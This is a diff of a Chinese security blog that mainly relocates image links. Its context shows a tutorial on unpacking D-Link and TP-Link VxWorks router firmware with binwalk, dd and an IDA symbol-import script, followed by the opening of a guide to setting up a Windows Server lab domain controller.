@@ -35,7 +35,7 @@
 <p>关于工具的安装就不提了，详细参考<a href="https://blog.pwntools.xyz/2019/10/18/IoT测试环境搭建/#more">IoT测试环境搭建</a></p>
 <h2 id="手动解压固件"><a href="#手动解压固件" class="headerlink" title="手动解压固件"></a>手动解压固件</h2><p>这里随便找一款<code>Dlink</code>的路由器的固件来分析,型号是<code>Dlink dir-815</code>，<code>Binwalk</code>分以一下固件的熵，如果很高，作为练习就可以换一款了。</p>
 <p>使用<code>file</code>查看文件:</p>
-<p><img src="http://file.smilehacker.net/image-20191103194436077.png" alt="image-20191103194436077"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191103194436077.png" alt="image-20191103194436077"></p>
 <p><code>file</code>没有发现符合的任何文件类型的匹配，但是不代表固件就是完全没接触过的格式。因为file是从首字节开始的，他会按照内部的数据进行比对。</p>
 <h3 id="手动判断文件类型"><a href="#手动判断文件类型" class="headerlink" title="手动判断文件类型"></a>手动判断文件类型</h3><p><code>file</code>没有发现符合的文件格式，就需要采用下面的方法分析.</p>
 <ol>
@@ -52,16 +52,16 @@
 <p>先检查是否存在<code>cfamfs</code>文件系统头部特征。因为不知道文件系统时大端序还是小端序，需要执行两次</p>
 <pre><code class="shell">strings DIR_815.bin | grep `python -c &#39;print &quot;\x28\xcd\x3d\x45&quot;&#39;`
 strings DIR_815.bin | grep `python -c &#39;print &quot;\x45\x3d\xcd\x28&quot;&#39;`</code></pre>
-<p><img src="http://file.smilehacker.net/image-20191103195839036.png" alt="image-20191103195839036"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191103195839036.png" alt="image-20191103195839036"></p>
 <p>没有发现<code>cfamfs</code>的头部特征，然后使用相同的办法，去检查是否存在<code>squashfs</code>的头部特征</p>
-<p><img src="http://file.smilehacker.net/image-20191103200044122.png" alt="image-20191103200044122"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191103200044122.png" alt="image-20191103200044122"></p>
 <p>找到了一个，但是不能确定该文件是不是一个<code>squashfs</code>文件系统，还需要进一步确定。</p>
 <h4 id="确定文件系统"><a href="#确定文件系统" class="headerlink" title="确定文件系统"></a>确定文件系统</h4><p>使用如下命令检测是否针对包含<code>squashfs</code>文件系统。</p>
 <pre><code class="shell">hexdump -C DIR_815.bin | grep -n &#39;hsqs&#39;
 
 # hexdump -C参数: 输出规范的十六进制和ASCII码。
 # grep -n参数: 在显示符合范本样式的那一列之前，标示出该列的编号。</code></pre>
-<p><img src="http://file.smilehacker.net/image-20191103200559319.png" alt="image-20191103200559319"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191103200559319.png" alt="image-20191103200559319"></p>
 <p>在偏移<code>0x000f008C</code>处发现了<code>hsqs</code>,从<code>0x000f0080C</code>这个地方复制<code>100</code>字节数据，再使用<code>file</code>命令查看。使用<code>dd</code>命令</p>
 <p>为什么时100字节？因为<code>squashfs</code>文件系统的头部校验不会超过100字节</p>
 <pre><code class="shell">dd if=DIR_815.bin bs=1 count=100 skip=983180 of=test
@@ -71,23 +71,23 @@ strings DIR_815.bin | grep `python -c &#39;print &quot;\x45\x3d\xcd\x28&quot;&#3
 # of 标准文件输出
 # bs 块大小
 # skip 用于跳过指向固件二进制映像中特定地址的指针</code></pre>
-<p><img src="http://file.smilehacker.net/image-20191103201356488.png" alt="image-20191103201356488"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191103201356488.png" alt="image-20191103201356488"></p>
 <p>这次就识别出来了。一定注意这里的文件大小<code>2808054</code></p>
 <h3 id="手动提取固件"><a href="#手动提取固件" class="headerlink" title="手动提取固件"></a>手动提取固件</h3><p>知道了在固件偏移<code>983180(0x000f0080C)</code>的地方，继续用<code>dd</code>提取出文件文件，然后尝试手动提取。</p>
 <pre><code class="shell">dd if=DIR_815.bin bs=1 skip=983180 count=2808054 of=test </code></pre>
 <p>这里一定要指定<code>count</code>，直接提取到文件末尾。在这中间还需要检查<code>squashfs</code>使用的压缩算法。</p>
-<p><img src="http://file.smilehacker.net/image-20191103233812796.png" alt="image-20191103233812796"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191103233812796.png" alt="image-20191103233812796"></p>
 <p>可以看到时<code>lzma</code>的格式，可以使用ubuntu自带的<code>unsquashfs</code>来解压，但是这个工具并不好用，可以使用<code>firmware-mod-kit</code>来解压。其实<code>firmware-mod-kit</code>也是调用<code>binwalk</code>来做的</p>
 <pre><code class="shell">./unsquashfs_all.sh ../Desktop/dir815_FW_101/_DIR_815.bin.extracted/F008C.squashfs</code></pre>
-<p><img src="http://file.smilehacker.net/image-20191105181148263.png" alt="image-20191105181148263"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191105181148263.png" alt="image-20191105181148263"></p>
 <p>可以在目录下看到解压出来的文件</p>
-<p><img src="http://file.smilehacker.net/image-20191105181232646.png" alt="image-20191105181232646"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191105181232646.png" alt="image-20191105181232646"></p>
 <h2 id="自动解压固件"><a href="#自动解压固件" class="headerlink" title="自动解压固件"></a>自动解压固件</h2><p>自动解压固件就不多介绍了，<code>binwalk -Me</code>直接解压，在这里记录一下<code>binwalk</code>的几个用法</p>
 <h3 id="扫描文件头"><a href="#扫描文件头" class="headerlink" title="扫描文件头"></a>扫描文件头</h3><pre><code class="shell">binwalk DIR_815.bin</code></pre>
-<p><img src="http://file.smilehacker.net/image-20191103205700709.png" alt="image-20191103205700709"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191103205700709.png" alt="image-20191103205700709"></p>
 <h3 id="Binwalk递归解压固件"><a href="#Binwalk递归解压固件" class="headerlink" title="Binwalk递归解压固件"></a>Binwalk递归解压固件</h3><pre><code class="shell">binwalk -Me DIR_815.bin</code></pre>
 <p>解压的明明白白</p>
-<p><img src="http://file.smilehacker.net/image-20191103205819179.png" alt="image-20191103205819179"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191103205819179.png" alt="image-20191103205819179"></p>
 <h3 id="Binwalk识别大端序小端序"><a href="#Binwalk识别大端序小端序" class="headerlink" title="Binwalk识别大端序小端序"></a>Binwalk识别大端序小端序</h3><pre><code class="shell">binwalk -A DIR_815.bin</code></pre>
 <p>不是很准确</p>
 <h3 id="Binwalk-熵值分析"><a href="#Binwalk-熵值分析" class="headerlink" title="Binwalk 熵值分析"></a>Binwalk 熵值分析</h3><pre><code class="shell">binwalk -E DIR_815.bin
@@ -95,13 +95,13 @@ strings DIR_815.bin | grep `python -c &#39;print &quot;\x45\x3d\xcd\x28&quot;&#3
 # python2需要安装sudo apt-get install python-matplotlib
 # python3需要安装sudo apt-get install python3-matplotlib</code></pre>
 <p>根据熵值可以判断该固件是否加密。</p>
-<p><img src="http://file.smilehacker.net/image-20191105174637703.png" alt="image-20191105174637703"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191105174637703.png" alt="image-20191105174637703"></p>
 <p>  简单地说，一个系统越是有序，信息熵就越低；反之，一个系统越是混乱，信息熵就越高。 </p>
 <p><code>Binwalk</code>没什么好说的，看看官方文档就好了。</p>
 <h2 id="Vxworks固件解压及IDA修复过程-ghidra"><a href="#Vxworks固件解压及IDA修复过程-ghidra" class="headerlink" title="Vxworks固件解压及IDA修复过程(ghidra)"></a>Vxworks固件解压及IDA修复过程(ghidra)</h2><p>搞一个<code>TPLINK</code>的路由器，之前没搞过，跟普通的文件系统不太一样。但是网上的文章并不是很多，而且没有一个总结的非常清楚。这里记录一下，也不是非常清楚。</p>
 <p>TPlink基于<code>Vxworks</code>的路由器没有像<code>Linux</code>版本的根文件系统，整个系统就是一个大的bin文件，只要把bootloader加载到合适的位置就直接运行了。</p>
 <h3 id="使用Binwalk初步分析固件"><a href="#使用Binwalk初步分析固件" class="headerlink" title="使用Binwalk初步分析固件"></a>使用<code>Binwalk</code>初步分析固件</h3><p>先使用<code>binwalk</code>对文件进行扫描，看有没有什么敏感信息</p>
-<p><img src="http://file.smilehacker.net/image-20191105182511902.png" alt="image-20191105182511902"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191105182511902.png" alt="image-20191105182511902"></p>
 <p>除了开头的<strong>uImage header</strong>之外其余全都是<code>LZMA</code>压缩之后的数据，但是注意红框内的数据，<code>Binwalk</code>显示出来的大小，一个为<code>-1</code>，另一个为<code>3580296</code>，这两个都不太寻常，先看大小为<code>3M</code>的这份数据，他比其他的<code>lzma</code>压缩之后的数据要大的多，其中有可能包含一些数据。直接用<code>binwalk</code>解压，尽量不要给自己找事(用<code>dd</code>解压)</p>
 <pre><code class="shell">binwalk -e firmware.bin
 
@@ -111,29 +111,29 @@ dd if=firmware.bin of=10400.lzma skip=66560 bs=1 count=1241152 # 1307712-66560
 # lzma 解压
 lzma -d 10400.lzma</code></pre>
 <p>发现解压不出来。</p>
-<p><img src="http://file.smilehacker.net/image-20191106153809813.png" alt="image-20191106153809813"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191106153809813.png" alt="image-20191106153809813"></p>
 <p>用winhex打开固件看看<code>0x13F440</code>处的到底是什么数据。</p>
-<p><img src="http://file.smilehacker.net/image-20191106153957693.png" alt="image-20191106153957693"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191106153957693.png" alt="image-20191106153957693"></p>
 <p>这里看上去明显不像是数据的结尾。往上翻一翻。</p>
-<p><img src="http://file.smilehacker.net/image-20191106164741622.png" alt="image-20191106164741622"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191106164741622.png" alt="image-20191106164741622"></p>
 <p><code>13E6F4</code>好像更像时数据的结尾，将数据复制出来，并用<code>lzma</code>解压</p>
 <pre><code class="shell">dd if=WDR_7660_V1.0_2.0.16_190325.bin of=10400.lzma skip=66560 bs=1 count=1237748
 
 lzma -d 10400.lzma</code></pre>
-<p><img src="http://file.smilehacker.net/image-20191106165240644.png" alt="image-20191106165240644"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191106165240644.png" alt="image-20191106165240644"></p>
 <p>这个跟<code>binwalk -e</code>解压出来的结果一摸一样。这里记录以下一个解压的过程。</p>
 <h3 id="使用IDA分析10400"><a href="#使用IDA分析10400" class="headerlink" title="使用IDA分析10400"></a>使用IDA分析10400</h3><p> 由于IDA Pro无法识别该文件，提示为”Binary file”，因此需要确定CPU的架构及加载基址。在”uImage header”部分已经有一些信息，如下，可以看到CPU架构为<code>arm</code>。 </p>
-<p><img src="http://file.smilehacker.net/image-20191106165829158.png" alt="image-20191106165829158"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191106165829158.png" alt="image-20191106165829158"></p>
 <p> 在<code>uImage header</code>中有一个<code>Entry Point</code>地址<code>0x41C00000</code>，这个地址可能是<code>uBoo</code>t程序的加载基址，而不是<code>10400</code>文件的加载基址。采用该地址作为加载基址，虽然也能识别出<code>2000</code>多个函数，但在后续导入符号表时会对不上。 </p>
 <p>使用<code>Binwalk</code>识别程序是大端序还是小端序</p>
-<p><img src="http://file.smilehacker.net/image-20191106170029255.png" alt="image-20191106170029255"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191106170029255.png" alt="image-20191106170029255"></p>
 <p>现在还是差一个入口地址，这个地址要怎么找到？</p>
 <h3 id="固件加载地址分析"><a href="#固件加载地址分析" class="headerlink" title="固件加载地址分析"></a>固件加载地址分析</h3><p>这里目前的文章并没有说清楚这个地址是怎么来的，给人更多的感觉像猜出来的。。但是能解决问题就行。使用<code>Winhex</code>加载固件后，来到地址<code>0x10400</code>，然后将数据往前翻，在不远处你会发现这个地址。两处地址同时指向<code>0x40205000</code>。</p>
-<p><img src="http://file.smilehacker.net/image-20191105182421398.png" alt="image-20191105182421398"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191105182421398.png" alt="image-20191105182421398"></p>
 <p>这里还有一些其他的方法，参见：</p>
 <ul>
 <li><a href="https://paper.seebug.org/771/" target="_blank" rel="noopener">https://paper.seebug.org/771/</a>  </li>
-<li><a href="http://file.smilehacker.net/%E4%BD%BF%E7%94%A8Ghidra%E5%88%86%E6%9E%90VxWorks%E5%9B%BA%E4%BB%B6-%E6%9C%B1%E6%96%87%E5%93%B2-20190802.pdf" target="_blank" rel="noopener">使用Ghidra分析VxWorks固件-朱文哲-20190802.pdf</a></li>
+<li><a href="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/%E4%BD%BF%E7%94%A8Ghidra%E5%88%86%E6%9E%90VxWorks%E5%9B%BA%E4%BB%B6-%E6%9C%B1%E6%96%87%E5%93%B2-20190802.pdf" target="_blank" rel="noopener">使用Ghidra分析VxWorks固件-朱文哲-20190802.pdf</a></li>
 <li><a href="https://www.jianshu.com/p/12d8f509169c" target="_blank" rel="noopener">https://www.jianshu.com/p/12d8f509169c</a>  </li>
 </ul>
 <blockquote>
@@ -142,24 +142,24 @@ lzma -d 10400.lzma</code></pre>
 </blockquote>
 <p>IDA加载过程如下</p>
 <p>选择对应的架构平台，并设置加载地址</p>
-<p><img src="http://file.smilehacker.net/image-20191106173136394.png" alt="image-20191106173136394"></p>
-<p><img src="http://file.smilehacker.net/image-20191106173315351.png" alt="image-20191106173315351"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191106173136394.png" alt="image-20191106173136394"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191106173315351.png" alt="image-20191106173315351"></p>
 <p>加载成功后你会发现识别出来的函数很少,<code>Import</code>和<code>export</code>都是空的，而且。。没有符号表</p>
-<p><img src="http://file.smilehacker.net/image-20191106173426913.png" alt="image-20191106173426913"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191106173426913.png" alt="image-20191106173426913"></p>
 <p>接下来就要修复符号表了</p>
 <h3 id="修复符号表"><a href="#修复符号表" class="headerlink" title="修复符号表"></a>修复符号表</h3><p> 使用<code>binwalk</code>直接提取该固件，在提取后的目录中搜索包含<code>VxWorks</code>中的某个关键函数如<code>bzero</code>的文件，如下 </p>
 <pre><code class="shell">grep -r bzero</code></pre>
-<p><img src="http://file.smilehacker.net/image-20191106173810837.png" alt="image-20191106173810837"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191106173810837.png" alt="image-20191106173810837"></p>
 <p>发现<code>140B96</code>中发现了这个字符串，用strings查看下他内部的字符串</p>
-<p><img src="http://file.smilehacker.net/image-20191106175319206.png" alt="image-20191106175319206"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191106175319206.png" alt="image-20191106175319206"></p>
 <p>可以看到有非常多的函数名，那他就是符号表无疑了。使用<code>hexdump</code>查看其内容,并计算字符串</p>
-<p><img src="http://file.smilehacker.net/image-20191106174558913.png" alt="image-20191106174558913"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191106174558913.png" alt="image-20191106174558913"></p>
 <p>除了标记出来的，剩下的都是数据了，来计算一下符号名表的偏移。</p>
 <blockquote>
 <p>8(自身长度) + 8 (每组数据的长度) * 31ba(总共这么多个字符串)=18DD8</p>
 </blockquote>
 <p>之后使用hexdump查看下<code>18DD8</code>处的数据</p>
-<p><img src="http://file.smilehacker.net/image-20191106175050303.png" alt="image-20191106175050303"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191106175050303.png" alt="image-20191106175050303"></p>
 <p>可以看到计算无误，正好是符号名表的开始。加下来使用如下IDA脚本批量导入符号表。</p>
 <pre><code class="python">import idautils
 import idc
@@ -209,7 +209,7 @@ if __name__ == &quot;__main__&quot;:
     symbols_metadata = get_symbols_metadata()
     add_symbols(symbols_metadata)</code></pre>
 <p>使用IDA运行此脚本，结果如下。</p>
-<p><img src="http://file.smilehacker.net/image-20191106175803536.png" alt="image-20191106175803536"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/image-20191106175803536.png" alt="image-20191106175803536"></p>
 <p>识别出来了大部分函数以及近8000个函数</p>
 <h3 id="Ghidra-加载符号表"><a href="#Ghidra-加载符号表" class="headerlink" title="Ghidra 加载符号表"></a>Ghidra 加载符号表</h3><p>银河实验室开发了一个<code>vxhunter</code>，专门用于<code>vxworks</code>，但是测试了一下实际效果并不好。</p>
 <ul>
@@ -229,7 +229,7 @@ if __name__ == &quot;__main__&quot;:
 </li>
 <li><p><a href="http://galaxylab.com.cn/0x00-tp-link-wr886nv7-v1-1-0-路由器分析-固件初步分析/" target="_blank" rel="noopener">http://galaxylab.com.cn/0x00-tp-link-wr886nv7-v1-1-0-%e8%b7%af%e7%94%b1%e5%99%a8%e5%88%86%e6%9e%90-%e5%9b%ba%e4%bb%b6%e5%88%9d%e6%ad%a5%e5%88%86%e6%9e%90/</a> </p>
 </li>
-<li><p><a href="http://file.smilehacker.net/%E4%BD%BF%E7%94%A8Ghidra%E5%88%86%E6%9E%90VxWorks%E5%9B%BA%E4%BB%B6-%E6%9C%B1%E6%96%87%E5%93%B2-20190802.pdf" target="_blank" rel="noopener">使用Ghidra分析VxWorks固件-朱文哲-20190802.pdf</a></p>
+<li><p><a href="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8D%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/%E4%BD%BF%E7%94%A8Ghidra%E5%88%86%E6%9E%90VxWorks%E5%9B%BA%E4%BB%B6-%E6%9C%B1%E6%96%87%E5%93%B2-20190802.pdf" target="_blank" rel="noopener">使用Ghidra分析VxWorks固件-朱文哲-20190802.pdf</a></p>
 </li>
 </ul>
 ]]></content>
@@ -252,80 +252,80 @@ if __name__ == &quot;__main__&quot;:
 
 <h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>在我们开始配置域环境前，我们需要先给每台机器配置一个静态IP。如果不配置，在测试过程中服务器IP改变了将会是一个很尴尬的事情。已<code>Windows 2008 Server</code> 为例演示如何配置静态<code>IP</code>.</p>
 <p>我们在在虚拟机的网络配置处为测试网络配置一个IP段。以后用来测试的机器全部使用这个网卡就方便管理了。在虚拟机界面上选择 编辑-&gt;虚拟网络配置器,来到如下界面:</p>
-<p><img src="http://file.smilehacker.net/image-20191114150326707.png" alt="image-20191114150326707"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114150326707.png" alt="image-20191114150326707"></p>
 <p>点击更改配置,选择添加网络，直接选择确定即可:</p>
-<p><img src="http://file.smilehacker.net/image-20191114150419292.png" alt="image-20191114150419292"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114150419292.png" alt="image-20191114150419292"></p>
 <p>稍微等待一下，来到如下几面：</p>
-<p><img src="http://file.smilehacker.net/image-20191114150547375.png" alt="image-20191114150547375"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114150547375.png" alt="image-20191114150547375"></p>
 <p>选择仅主机模式(这个模式是无法上网的，如果想要上网可以选择NAT模式)，我们可以修改子网的IP段。我这里就不改了，就用默认的。完成后点击应用。等待一会，完成后关闭页面即可.</p>
-<p><img src="http://file.smilehacker.net/image-20191114150825809.png" alt="image-20191114150825809"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114150825809.png" alt="image-20191114150825809"></p>
 <p>我们右键虚拟机选项卡，设置网卡为我们刚刚配置的<code>Vmware2</code>，然后点击确定。</p>
-<p><img src="http://file.smilehacker.net/image-20191114151336368.png" alt="image-20191114151336368"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114151336368.png" alt="image-20191114151336368"></p>
 <p>之后选择网络-&gt;打开网络和共享中心</p>
-<p><img src="http://file.smilehacker.net/image-20191114151458107.png" alt="image-20191114151458107"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114151458107.png" alt="image-20191114151458107"></p>
 <p>选择更改适配器设置,</p>
-<p><img src="http://file.smilehacker.net/image-20191114151704217.png" alt="image-20191114151704217"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114151704217.png" alt="image-20191114151704217"></p>
 <p>右键选择属性.</p>
-<p><img src="http://file.smilehacker.net/image-20191114151624938.png" alt="image-20191114151624938"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114151624938.png" alt="image-20191114151624938"></p>
 <p>进行如下配置，注意设置DNS服务器为自身IP：</p>
-<p><img src="http://file.smilehacker.net/image-20191114152004703.png" alt="image-20191114152004703"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114152004703.png" alt="image-20191114152004703"></p>
 <p>一路确定点下来，然后就可以开始进入搭建域服务器的过程。</p>
 <h2 id="域控服务器搭建"><a href="#域控服务器搭建" class="headerlink" title="域控服务器搭建"></a>域控服务器搭建</h2><h3 id="配置DNS服务器"><a href="#配置DNS服务器" class="headerlink" title="配置DNS服务器"></a>配置DNS服务器</h3><p>这一步不是必须的，在安装Active Directory 域服务时可以同时装上DNS服务器。</p>
 <p>Active Directory 域服务安装向导–&gt;其它域控制服务器，勾上DNS服务器也有同样效果，我们按照最简单的来，所以勾上这一项。</p>
 <p>打开服务器管理 选择角色-&gt;添加角色</p>
-<p><img src="http://file.smilehacker.net/image-20191114145516595.png" alt="image-20191114145516595"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20191114145516595.png" alt="image-20191114145516595"></p>
 <p>在弹出的页面直接点击下一步，来到如下页面，勾选<code>DNS服务器</code>.并点击下一步。</p>
-<p><img src="http://file.smilehacker.net/image-20191114152358096.png" alt="image-20191114152358096"></p>
